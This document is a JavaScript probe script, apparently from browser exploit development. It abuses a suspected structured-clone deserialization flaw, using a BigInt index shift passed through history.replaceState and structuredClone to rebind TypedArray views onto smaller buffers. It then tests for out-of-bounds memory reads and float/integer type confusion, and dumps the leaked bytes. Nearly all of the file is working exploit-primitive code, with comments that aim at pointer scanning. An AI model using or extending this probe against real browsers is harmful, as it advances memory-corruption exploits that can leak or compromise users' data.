// SC OOB probe — test if TypedArray length validation is skipped during deserialization
// If a view's buffer reference shifts to a SMALLER buffer, we might get OOB access
(function() {
'use strict';
var results = [];

function hexDump(u8, off, len) {
  var h = '';
  for (var i = off; i < Math.min(off + len, u8.length); i++)
    h += u8[i].toString(16).padStart(2, '0');
  return h;
}

function f64ToHex(v) {
  var buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = v;
  var u = new Uint32Array(buf);
  return '0x' + u[1].toString(16).padStart(8,'0') + u[0].toString(16).padStart(8,'0');
}

// Test 1: Large view referencing small buffer after SC confusion
// Serialize: [1n, smallBuf(8), largeBuf(4096), viewOfLargeBuf(len=4096)]
// After BigInt shift: viewOfLargeBuf's buffer ref shifts from largeBuf to smallBuf
// If deserializer doesn't validate: view.length=4096 but buffer=8 bytes = OOB!
try {
  var small = new ArrayBuffer(8);
  new Uint8Array(small).fill(0x41); // marker A

  var large = new ArrayBuffer(4096);
  new Uint8Array(large).fill(0x42); // marker B

  var largeView = new Uint8Array(large); // length=4096, buffer=large

  // SC payload: BigInt shifts pool indices by 1
  // Pool after serialization: [small, large, largeView]
  // BigInt shift makes largeView's buffer ref point to small instead of large
  var filler = [1n, small, large, largeView];
  while (filler.length < 80) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(83);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[82] = -1;

  history.replaceState(outer, '');
  var cl = history.state;
  history.replaceState(null, '');

  if (!cl || !cl[0]) {
    results.push({ name: 'oob_large_on_small', result: 'clone_failed' });
  } else {
    var cv = cl[0][3];
    if (cv instanceof Uint8Array) {
      results.push({
        name: 'oob_large_on_small',
        result: 'GOT_VIEW',
        viewLen: cv.length,
        bufLen: cv.buffer.byteLength,
        byte0: cv[0],
        oob: cv.length > cv.buffer.byteLength,
        first8: hexDump(cv, 0, 8)
      });

      // If OOB, read past the buffer boundary!
      if (cv.length > cv.buffer.byteLength) {
        var oobData = [];
        for (var i = 0; i < Math.min(cv.length, 256); i += 4) {
          var dv = new DataView(cv.buffer);
          try {
            var val = dv.getUint32(i, true);
            oobData.push('0x' + (val>>>0).toString(16).padStart(8,'0'));
          } catch(e) {
            oobData.push('ERR@' + i);
            break;
          }
        }
        results.push({
          name: 'oob_read',
          data: oobData.slice(0, 32)
        });
      }
    } else {
      results.push({
        name: 'oob_large_on_small',
        result: 'not_u8',
        type: typeof cv,
        constructor: cv && cv.constructor ? cv.constructor.name : 'none'
      });
    }
  }
} catch(e) {
  results.push({ name: 'oob_large_on_small', error: e.message.substring(0, 80) });
}

// Test 2: Same thing but with Float64Array for pointer-width reads
try {
  var small2 = new ArrayBuffer(8);
  new Uint8Array(small2).fill(0x43);

  var large2 = new ArrayBuffer(4096);
  new Uint8Array(large2).fill(0x44);

  var largeF64 = new Float64Array(large2); // length=512 (4096/8), buffer=large2

  var filler2 = [1n, small2, large2, largeF64];
  while (filler2.length < 80) filler2.push({ q: filler2.length });
  var ref2 = {};
  var outer2 = new Array(83);
  outer2[0] = filler2;
  outer2[1] = ref2;
  outer2[2] = ref2;
  outer2[82] = -1;

  history.replaceState(outer2, '');
  var cl2 = history.state;
  history.replaceState(null, '');

  if (cl2 && cl2[0] && cl2[0][3] instanceof Float64Array) {
    var cv2 = cl2[0][3];
    results.push({
      name: 'oob_f64_on_small',
      viewLen: cv2.length,
      bufLen: cv2.buffer.byteLength,
      oob: cv2.length * 8 > cv2.buffer.byteLength,
      byte0hex: f64ToHex(cv2[0])
    });
  } else {
    results.push({
      name: 'oob_f64_on_small',
      result: cl2 ? 'wrong_type' : 'clone_failed'
    });
  }
} catch(e) {
  results.push({ name: 'oob_f64_on_small', error: e.message.substring(0, 80) });
}

// Test 3: Try structuredClone too (might have different validation path)
try {
  if (typeof structuredClone === 'function') {
    var small3 = new ArrayBuffer(8);
    new Uint8Array(small3).fill(0x55);

    var large3 = new ArrayBuffer(4096);
    new Uint8Array(large3).fill(0x66);

    var largeView3 = new Uint8Array(large3);

    var filler3 = [1n, small3, large3, largeView3];
    while (filler3.length < 80) filler3.push({ r: filler3.length });
    var ref3 = {};
    var outer3 = new Array(83);
    outer3[0] = filler3;
    outer3[1] = ref3;
    outer3[2] = ref3;
    outer3[82] = -1;

    var cl3 = structuredClone(outer3);

    if (cl3 && cl3[0] && cl3[0][3] instanceof Uint8Array) {
      var cv3 = cl3[0][3];
      results.push({
        name: 'sc_oob',
        viewLen: cv3.length,
        bufLen: cv3.buffer.byteLength,
        oob: cv3.length > cv3.buffer.byteLength,
        byte0: cv3[0]
      });
    } else {
      results.push({ name: 'sc_oob', result: 'wrong_type' });
    }
  } else {
    results.push({ name: 'sc_oob', result: 'no_structuredClone' });
  }
} catch(e) {
  results.push({ name: 'sc_oob', error: e.message.substring(0, 80) });
}

// Test 4: Offset mismatch — view with large offset on small buffer
// Create view: new Uint8Array(largeBuf, 2048, 64) — after shift, buffer is small
try {
  var small4 = new ArrayBuffer(64);
  new Uint8Array(small4).fill(0x77);

  var large4 = new ArrayBuffer(4096);
  new Uint8Array(large4).fill(0x88);

  // View starting at offset 2048 into the large buffer
  var offsetView = new Uint8Array(large4, 2048, 64);

  var filler4 = [1n, small4, large4, offsetView];
  while (filler4.length < 80) filler4.push({ s: filler4.length });
  var ref4 = {};
  var outer4 = new Array(83);
  outer4[0] = filler4;
  outer4[1] = ref4;
  outer4[2] = ref4;
  outer4[82] = -1;

  history.replaceState(outer4, '');
  var cl4 = history.state;
  history.replaceState(null, '');

  if (cl4 && cl4[0] && cl4[0][3] instanceof Uint8Array) {
    var cv4 = cl4[0][3];
    results.push({
      name: 'oob_offset',
      viewLen: cv4.length,
      viewOffset: cv4.byteOffset,
      bufLen: cv4.buffer.byteLength,
      oob: cv4.byteOffset + cv4.length > cv4.buffer.byteLength,
      byte0: cv4[0]
    });

    // If OOB via offset, try reading
    if (cv4.byteOffset + cv4.length > cv4.buffer.byteLength) {
      try {
        var oobBytes = [];
        for (var i = 0; i < cv4.length; i++) {
          oobBytes.push(cv4[i]);
        }
        results.push({
          name: 'oob_offset_read',
          hex: hexDump(new Uint8Array(oobBytes), 0, 32)
        });
      } catch(e) {
        results.push({ name: 'oob_offset_read', error: e.message.substring(0, 60) });
      }
    }
  } else {
    results.push({
      name: 'oob_offset',
      result: cl4 ? 'wrong_type' : 'clone_failed'
    });
  }
} catch(e) {
  results.push({ name: 'oob_offset', error: e.message.substring(0, 80) });
}

// Test 5: Uint32Array view — 4-byte aligned reads for pointer scanning
try {
  var small5 = new ArrayBuffer(16);
  new Uint8Array(small5).fill(0x99);

  var large5 = new ArrayBuffer(4096);
  new Uint8Array(large5).fill(0xAA);

  var u32view = new Uint32Array(large5); // length=1024

  var filler5 = [1n, small5, large5, u32view];
  while (filler5.length < 80) filler5.push({ t: filler5.length });
  var ref5 = {};
  var outer5 = new Array(83);
  outer5[0] = filler5;
  outer5[1] = ref5;
  outer5[2] = ref5;
  outer5[82] = -1;

  history.replaceState(outer5, '');
  var cl5 = history.state;
  history.replaceState(null, '');

  if (cl5 && cl5[0] && cl5[0][3] instanceof Uint32Array) {
    var cv5 = cl5[0][3];
    results.push({
      name: 'oob_u32',
      viewLen: cv5.length,
      bufLen: cv5.buffer.byteLength,
      oob: cv5.length * 4 > cv5.buffer.byteLength,
      val0: '0x' + (cv5[0]>>>0).toString(16).padStart(8,'0')
    });
  } else {
    results.push({
      name: 'oob_u32',
      result: cl5 ? 'wrong_type' : 'clone_failed'
    });
  }
} catch(e) {
  results.push({ name: 'oob_u32', error: e.message.substring(0, 80) });
}

// Test 6: Same-size buffers but different view types — type confusion of data interpretation
// If small buffer has a pointer-like value and view interprets as Float64,
// NaN canonicalization is the blocker. Test: do we get raw bits or canonicalized NaN?
try {
  var bufA = new ArrayBuffer(64);
  var u32A = new Uint32Array(bufA);
  // Write a fake pointer pattern: 0x00000001_DEADBEEF
  u32A[0] = 0xDEADBEEF;
  u32A[1] = 0x00000001;
  // Another pattern in NaN range: 0x7FF80000_00000000 (canonical NaN)
  u32A[2] = 0x00000000;
  u32A[3] = 0x7FF80000;
  // sNaN: 0x7FF00000_00000001
  u32A[4] = 0x00000001;
  u32A[5] = 0x7FF00000;

  var bufB = new ArrayBuffer(64);
  new Uint8Array(bufB).fill(0);
  var f64B = new Float64Array(bufB);
  var u32B = new Uint32Array(bufB);

  // Confuse: f64B should now read from bufA
  var filler6 = [1n, bufA, bufB, f64B];
  while (filler6.length < 80) filler6.push({ u: filler6.length });
  var ref6 = {};
  var outer6 = new Array(83);
  outer6[0] = filler6;
  outer6[1] = ref6;
  outer6[2] = ref6;
  outer6[82] = -1;

  history.replaceState(outer6, '');
  var cl6 = history.state;
  history.replaceState(null, '');

  if (cl6 && cl6[0] && cl6[0][3] instanceof Float64Array) {
    var cf = cl6[0][3];
    // Also create a Uint32Array on the same confused buffer
    var cu = new Uint32Array(cf.buffer);

    results.push({
      name: 'type_confusion_read',
      f64_0: f64ToHex(cf[0]),
      f64_1: f64ToHex(cf[1]),
      f64_2: f64ToHex(cf[2]),
      u32_0: '0x' + (cu[0]>>>0).toString(16).padStart(8,'0'),
      u32_1: '0x' + (cu[1]>>>0).toString(16).padStart(8,'0'),
      u32_2: '0x' + (cu[2]>>>0).toString(16).padStart(8,'0'),
      u32_3: '0x' + (cu[3]>>>0).toString(16).padStart(8,'0'),
      u32_4: '0x' + (cu[4]>>>0).toString(16).padStart(8,'0'),
      u32_5: '0x' + (cu[5]>>>0).toString(16).padStart(8,'0'),
      confused: cu[0] === 0xDEADBEEF
    });
  } else {
    results.push({ name: 'type_confusion_read', result: 'wrong_type' });
  }
} catch(e) {
  results.push({ name: 'type_confusion_read', error: e.message.substring(0, 80) });
}

return JSON.stringify(results);
})();
